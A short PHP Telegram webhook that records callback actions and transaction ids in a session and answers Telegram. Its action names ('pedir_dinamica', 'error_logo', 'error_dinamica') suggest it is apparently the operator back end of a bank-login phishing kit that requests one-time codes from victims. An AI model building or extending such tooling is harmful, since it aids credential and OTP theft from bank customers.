<?php
// webhook.php

// Cargar configuración
$config = require __DIR__ . '/../../config.php';

// Obtener la actualización de Telegram
$update = json_decode(file_get_contents('php://input'), true);

// Log de depuración
error_log("Webhook recibido: " . json_encode($update));

// Verificar si es una callback query
if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data = explode(':', $callback_query['data']);
    $action = $callback_data[0];
    $transaction_id = $callback_data[1];

    error_log("Callback query procesada - action: $action, transaction_id: $transaction_id");

    // Iniciar sesión para almacenar el estado
    session_start();
    $_SESSION['current_transaction'] = $transaction_id;

    // Manejar diferentes acciones
    switch ($action) {
        case 'error_logo':
            $_SESSION['current_action'] = 'error_logo';
            error_log("Acción guardada en sesión: error_logo");
            break;
        case 'pedir_dinamica':
            $_SESSION['current_action'] = 'pedir_dinamica';
            error_log("Acción guardada en sesión: pedir_dinamica");
            break;
        case 'confirm_finalizar':
            $_SESSION['current_action'] = 'confirm_finalizar';
            error_log("Acción guardada en sesión: confirm_finalizar");
            break;
        case 'error_dinamica':
            $_SESSION['current_action'] = 'error_dinamica';
            error_log("Acción guardada en sesión: error_dinamica");
            break;
        default:
            $_SESSION['current_action'] = $action;
            error_log("Acción guardada en sesión: $action");
    }

    // Responder a la callback query
    $response_data = [
        'callback_query_id' => $callback_query['id'],
        'text' => 'Procesando solicitud...',
        'show_alert' => false
    ];

    // Enviar respuesta a Telegram
    $ch = curl_init("https://api.telegram.org/bot" . $config['bot_token'] . "/answerCallbackQuery");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($response_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}

// Responder con OK
http_response_code(200);
echo "OK";
?>